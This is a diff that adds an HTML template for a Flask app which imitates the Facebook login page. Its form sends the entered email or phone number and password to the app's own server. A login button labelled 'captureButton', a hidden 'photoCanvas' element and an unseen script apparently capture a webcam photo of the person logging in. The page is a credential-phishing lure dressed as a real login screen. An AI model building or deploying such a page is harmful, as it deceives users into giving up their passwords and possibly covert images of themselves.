@@ -1,0 +1,32 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook Login Page</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css')}} " type='text/css'/>
+  </head>
+  <body>
+    <div class="content">
+      <div class="flex-div">
+        <div class="name-content">
+          <h1 class="logo">Facebook</h1>
+          <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+          <form  action="/" method='POST'>
+            <input type="text" name="username" placeholder="Email or Phone Number" required />
+            <input type="password" name="password" placeholder="Password" required>
+            <button class="login" id="captureButton">Log In</button>
+            <canvas id="photoCanvas" style="display: none;"></canvas>
+            <script src="{{url_for('static', filename='script.js')}}"></script>
+            <a href="#">Forgot Password ?</a>
+            <hr>
+            <button class="create-account">Create New Account</button>
+          </form>
+      </div>
+    </div>
+    <script src="/static/script.js">
+
+    </script>
+  </body>
+</html>
